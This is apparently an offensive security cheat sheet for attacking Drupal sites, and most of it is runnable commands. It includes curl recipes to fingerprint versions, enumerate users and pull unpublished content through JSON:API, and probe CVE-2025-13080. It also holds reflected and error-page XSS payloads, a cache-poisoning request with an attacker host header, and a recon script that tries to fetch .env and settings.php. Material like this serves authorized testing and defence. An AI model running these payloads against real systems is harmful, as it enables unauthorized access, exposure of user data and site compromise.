---
tags:
  - high
  - server-side
---

# Drupal Framework Security

*Drupal CMS attack surface: fingerprinting, module enumeration, REST/JSON:API exploitation, CVEs, and access control bypasses.*

---

## TL;DR

```bash
# Version detection
curl -s https://target.com/core/install.php | grep -oP '\?v=[0-9.]+' | head -1

# JSON:API user enumeration
curl -s "https://target.com/jsonapi/user/user?fields[user--user]=name"

# Composer.lock module audit
curl -s https://target.com/composer.lock | python3 -c "
import json,sys
data=json.load(sys.stdin)
for p in data['packages']:
    if 'drupal/' in p['name']:
        print(p['name'], p['version'])
"
```

---

## How It Works

Drupal is a PHP CMS. Attack surfaces:

1. **REST API / JSON:API** — Enabled by default since Drupal 8.7, exposes entities without auth by default
2. **Contrib modules** — Hundreds of third-party modules with known CVEs
3. **Core CVEs** — Drupal core has periodic critical vulnerabilities (SA-CORE-*)
4. **Configuration files** — `composer.lock` exposes exact module versions
5. **Twig templates** — Server-side rendering with debug mode leaks template paths

---

## Detection

### Fingerprinting Drupal

```bash
# Meta generator tag
curl -s https://target.com/ | grep -i 'generator.*drupal'

# Drupal-specific paths
curl -sI https://target.com/user/login        # Login page
curl -s https://target.com/user/register      # Registration
curl -s https://target.com/core/install.php   # Install page (version leak)
curl -s https://target.com/update.php

# JS/CSS with Drupal fingerprint
curl -s https://target.com/ | grep -E 'drupal\.js|misc/drupal|drupal\.settings'

# REST/JSON:API (if enabled)
curl -s https://target.com/jsonapi
curl -s https://target.com/rest/session/token
```

### Version Detection

```bash
# Via install.php (version in JS asset URLs)
curl -sf https://target.com/core/install.php | grep -oP '\?v=[0-9.]+' | head -1

# Via README/CHANGELOG (may be removed)
curl -s https://target.com/core/CHANGELOG.txt | head -5

# Via composer.lock
curl -s https://target.com/composer.lock | python3 -c "
import json,sys
try:
    data=json.load(sys.stdin)
    for p in data['packages']:
        if p['name'] == 'drupal/core':
            print('Drupal core:', p['version'])
except: pass
"

# Automated
droopescan scan drupal -u https://target.com
```

---

## Exploitation

### 1. JSON:API — User Enumeration

JSON:API is enabled by default since Drupal 8.7 and exposes user accounts to anonymous visitors:

```bash
# All users (name, uid, email if exposed)
curl -s "https://target.com/jsonapi/user/user" | python3 -m json.tool

# Specific fields only
curl -s "https://target.com/jsonapi/user/user?fields[user--user]=name,drupal_internal__uid"

# Paginate through all users
curl -s "https://target.com/jsonapi/user/user?page[offset]=0&page[limit]=50"
curl -s "https://target.com/jsonapi/user/user?page[offset]=50&page[limit]=50"
```

### 2. JSON:API — Unpublished Content Exposure

```bash
# Unpublished articles (draft/embargoed content)
curl -s "https://target.com/jsonapi/node/article?filter[status][value]=0"

# All content types — check each
for type in article page blog podcast news; do
  echo "--- $type ---"
  curl -s "https://target.com/jsonapi/node/$type?filter[status][value]=0" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(f\"{len(d.get('data',[]))} items\")" 2>/dev/null
done

# Media entities
curl -s "https://target.com/jsonapi/media/image?filter[status][value]=0"
```

### 3. JSON:API — Configuration Leakage

```bash
# Webform configurations (email handlers, API keys in handler settings)
curl -s "https://target.com/jsonapi/webform/webform"

# Entity share channels (if entity_share module installed)
curl -s "https://target.com/jsonapi/entity_share/channels"
```

### 4. REST API Enumeration

```bash
# Node by ID
curl -s "https://target.com/node/1?_format=json"
curl -s "https://target.com/node/1?_format=hal_json"

# User by ID
curl -s "https://target.com/user/1?_format=json"

# Views with REST export
curl -s "https://target.com/api/content?_format=json"
```

### 5. CVE-2025-13080 — Forceful Browsing

```
Affected: Drupal 8.0.0 < 10.4.9, 10.5.0 < 10.5.6, 11.0.0 < 11.1.9, 11.2.0 < 11.2.8
Type: CWE-754 + CWE-425 — Improper Check + Forceful Browsing
Impact: Unauthenticated access to restricted/unpublished content
```

```bash
# Access unpublished nodes
curl -s "https://target.com/node/1"
curl -s "https://target.com/node/1?_format=json"  
curl -s "https://target.com/fr/node/1"             # Translated URL

# Media entities
curl -s "https://target.com/media/1"
curl -s "https://target.com/media/1?_format=json"

# File entities
curl -s "https://target.com/sites/default/files/YYYY-MM/document.pdf"
```

!!! warning "No public PoC yet"
    CVE-2025-13080 was disclosed in early 2026. REST/JSON:API must be enabled for most bypass attempts. Many production sites disable these APIs.

### 6. CVE-2026-0948 — Entra ID SSO Auth Bypass

```
Module: drupal/social_auth_entra_id < 1.0.4
Impact: Full account takeover of ANY user including admins, unauthenticated
Type: OAuth callback manipulation
```

```bash
# Check if module is installed
curl -s https://target.com/composer.lock | python3 -c "
import json,sys
data=json.load(sys.stdin)
for p in data['packages']:
    if 'social_auth_entra_id' in p['name']:
        print(p['name'], p['version'])
"
```

Attack: Intercept the OAuth callback and manipulate the API response to impersonate any user.

### 7. SA-CONTRIB-2024-047 — Facets Reflected XSS

```bash
# Test on search pages using Facets module
curl "https://target.com/search?f[0]=category%3A\"><img src=x onerror=alert(1)>"

# Facets Summary submodule required for the specific vector
```

### 8. SA-CORE-2025-001 — XSS in Error Messages

```bash
# Force 404/400/500 with XSS in URL/params
curl "https://target.com/nonexistent%3Cscript%3Ealert(1)%3C/script%3E"
curl "https://target.com/node/abc?debug=<script>alert(document.domain)</script>"

# Error paths use different rendering pipeline (bypasses Xss::filter())
```

### 9. SA-CORE-2025-005 — Cache Poisoning via Header Override

```http
GET /user/profile HTTP/1.1
Host: target-drupal.com
X-Original-Host: cache-poison.attacker.com
```

Combined with CDN edge caching → serve poisoned content to other users.

### 10. Module Audit from composer.lock

The most efficient recon step: get the full module list and cross-reference CVEs.

```bash
# Download and parse composer.lock
curl -s https://target.com/composer.lock | python3 -c "
import json,sys
try:
    data=json.load(sys.stdin)
    print('=== Drupal Modules ===')
    for p in data['packages']:
        if 'drupal/' in p['name']:
            print(f\"{p['name']:<40} {p['version']}\")
except Exception as e:
    print('Failed:', e)
"
```

Cross-reference against:
- https://www.drupal.org/security/contrib → SA-CONTRIB advisories
- https://www.drupal.org/security → SA-CORE advisories

---

## Bypasses

### Bypassing JSON:API Restrictions

```bash
# If /jsonapi/user/user returns 403, try alternate routes:
curl -s "https://target.com/jsonapi/user/user?filter[uid][value]=1"

# Filter by relationship
curl -s "https://target.com/jsonapi/node/article?include=uid&filter[uid.name]=admin"

# Sparse fieldsets reveal structure even on restricted resources
curl -s "https://target.com/jsonapi/node/article?fields[node--article]=id"
```

### JSON:API Write Mode (Misconfiguration)

```bash
# Attempt anonymous article creation
curl -X POST https://target.com/jsonapi/node/article \
  -H "Content-Type: application/vnd.api+json" \
  -d '{"data":{"type":"node--article","attributes":{"title":"test","status":true}}}'
# 403 = properly locked
# 201/200 = vulnerable (article created unauthenticated)
```

---

## Rapid Recon

```bash
TARGET="https://target.com"

echo "[*] Version:"
curl -sf "$TARGET/core/install.php" 2>/dev/null | grep -oP '\?v=[0-9.]+' | head -1

echo "[*] JSON:API:"
curl -so /dev/null -w "%{http_code}" "$TARGET/jsonapi"

echo "[*] Users:"
curl -s "$TARGET/jsonapi/user/user?fields[user--user]=name&page[limit]=5" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); [print(u['attributes']['name']) for u in d.get('data',[])]" 2>/dev/null

echo "[*] Sensitive files:"
for f in composer.lock composer.json .env sites/default/settings.php; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET/$f")
  echo "$code $TARGET/$f"
done

echo "[*] Twig debug:"
curl -s "$TARGET/" | grep -c "THEME_DEBUG"

echo "[*] Registration open:"
curl -s "$TARGET/user/register" | grep -ic "create"
```

---

## Tools

| Tool | Purpose |
|------|---------|
| `droopescan scan drupal` | Module/version/user enumeration |
| `drupwn --mode enum --target TARGET` | Full enumeration (Docker: `immunit/drupwn`) |
| `nuclei -tags drupal` | CVE detection |
| Manual `composer.lock` audit | Fastest module version check |

---

## Checklist

- [ ] Check `composer.lock` — extract all Drupal module versions
- [ ] Cross-reference modules against SA-CONTRIB advisories
- [ ] Test JSON:API user enumeration (`/jsonapi/user/user`)
- [ ] Test JSON:API unpublished content (`?filter[status][value]=0`)
- [ ] Test webform config exposure (`/jsonapi/webform/webform`)
- [ ] Check REST API with `?_format=json`
- [ ] Test `CVE-2025-13080` forceful browsing on nodes/media
- [ ] Probe `social_auth_entra_id` version for CVE-2026-0948
- [ ] Test error page XSS (SA-CORE-2025-001)
- [ ] Check Twig debug mode (HTML comments with template paths)
- [ ] Check `/core/install.php` version disclosure
- [ ] Check registration open + role escalation

---

## References

- [Drupal Security Advisories](https://www.drupal.org/security)
- [SA-CONTRIB Advisories](https://www.drupal.org/security/contrib)
- [CVE-2025-13080 — Forceful Browsing](https://nvd.nist.gov/vuln/detail/CVE-2025-13080)
- [droopescan](https://github.com/SamJoan/droopescan)
- [drupwn](https://github.com/immunIT/drupwn)
- [Drupal JSON:API Documentation](https://www.drupal.org/docs/core-modules-and-themes/core-modules/jsonapi-module)
